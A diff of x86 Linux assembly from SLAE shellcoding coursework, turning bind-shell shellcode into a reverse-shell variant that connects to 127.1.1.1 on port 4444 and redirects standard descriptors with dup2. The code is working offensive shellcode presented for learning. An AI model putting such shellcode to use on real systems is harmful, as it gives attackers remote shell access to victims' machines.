@@ -1,16 +1,14 @@
-; x86 Assembly Language and Shellcoding on Linux - SLAE
-; Author: Jozsef Ottcsak - fuxboxz - PA-7449 
-; 
 global _start
 
 section .text
 
 _start:
-    ; xor register eax so we avoid null byte, then mov value into other registers as well   
+        ; xor register eax so we avoid null byte, then mov value into other registers as well   
     xor eax, eax
     mov ebx, eax
     mov ecx, eax
     mov edi, eax
+    mov esi, eax
 
 socket:
     ; ====================================================================================================
@@ -39,72 +37,30 @@ socket:
 
     int 0x80 ; sys_socketcall
 
-bind:
-    ; =========================================================================
-    ; Bind address to socket - http://man7.org/linux/man-pages/man2/bind.2.html
-    ; =========================================================================
-    ; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
-    ; #define SYS_BIND        2               /* sys_bind(2)  - $ find /usr/include -name "net.h" |  cat $(head -n 2) | grep "BIND"
-  
-    mov esi, eax ; mov file descriptor from eax into esi after syscall
-    
-    mov al, 0x66 ; 102 sys_socketcall - eax was overwritten by the file descriptor
+connect:
+    ; ===============================================================
+    ; Connect to remote address - https://linux.die.net/man/2/connect
+    ; ===============================================================
+    ; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
+    ; #define SYS_CONNECT        3               /* - $ find /usr/include -name "net.h" |  cat $(head -n 2) | grep "CONNECT"
 
-    pop ebx ; SYS_BIND 0x2
-    pop edi ; 0x1
+    mov esi, eax ; move sockfd into esi
+    mov al, 0x66; 102 sys_socketcall
+    mov bl, 0x3; SYS_CONNECT 
 
-    ;struct sockaddr_in {
-    ;           sa_family_t    sin_family; /* address family: AF_INET */
-    ;           in_port_t      sin_port;   /* port in network byte order */
-    ;           struct in_addr sin_addr;   /* internet address */
-    ;       };
+    ; 127.0.0.0/8 is loopback, so using 127.1.1.1 means that we don't have to deal with nulls
+    push 0x0101017f; 127.1.1.1 in network byte order 
+    push word 0x5c11; port 4444 in network byte order
+    push word 0x2 ; 0x2, sin_family - AF_INET- bx same value as SYS_BIND
 
-    xor edx, edx ; xor out edx
-    push edx ; struct in_addr 0.0.0.0
-
-    push word 0x5c11; port 4444 in network endian format
-    push word bx ; 0x2, sin_family - AF_INET- bx same value as SYS_BIND
+    mov ecx, esp ; store sockaddr_in pointer
     push byte 16 ; socketlen_t addrlen 16 bit
-    push ecx ; push null
 
-    push esi ; int sockfd
+    push ecx ; sockaddr_in pointer
+    push esi ; push sockfd
+
     mov ecx, esp ; store argument address in ecx
-
-    int 0x80 ; sys_socketcall
-
-listen:
-    ; =====================================================================
-    ; Listen on socket - http://man7.org/linux/man-pages/man2/listen.2.html
-    ; =====================================================================
-    ; 0x4 - $ find /usr/include -name "net.h" |  cat $(head -n 2) | grep "LISTEN"
-    ; #define SYS_LISTEN      4               /* sys_listen(2) 
-    ; int listen(int sockfd, int backlog);
-                
-    mov al, 0x66 ; 102 sys_socketcall
-    mov bl, 0x4 ; 0x4 - SYS_LISTEN
-    pop edx ; fetch sockfd from stack
-
-    int 0x80 ; sys_socketcall
-
-accept:
-    ; ================================================================================
-    ; Accept incoming connections - http://man7.org/linux/man-pages/man2/accept.2.html
-    ; ================================================================================
-    ; 0x5 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) 
-    ; $ find /usr/include -name "net.h" |  cat $(head -n 2) | grep "ACCEPT"
-    ; #define SYS_ACCEPT      5               /* sys_accept(2)                */
-    ; as we don't accept connections from one specific client, we can set the arguments null except for the sockfd
-
-    xor eax, eax ; null out eax so we can push nulls
-    push eax ; socklen_t *addrlen => null
-    push eax ; sockaddr *addr => null
-
-    mov al, 0x66 ; 102 sys_socketcall
-    mov bl, 0x5 ; 0x5 SYS_ACCEPT
-
-    push edx ; push sockfd to stack for accept()
-    mov ecx, esp ; store argument address in ecx
-    int 0x80 ; sys_socketcall
+    int 0x80 ; syscall
 
 duplicate:
     ; ============================================================
@@ -114,8 +70,6 @@ duplicate:
     ; 63 = - int dup2(int oldfd=ebx, int newfd=ecx); 
     ; $ find /usr/include -name "unistd_32.h" | cat $(head -n 1) | grep "dup2"
     ; #define __NR_dup2 63
-    
-    xchg eax, ebx ; move fdescriptor from accept into ebx for oldfd
     xor ecx, ecx ; zero out ecx for counter
 
     ; Looping to set up
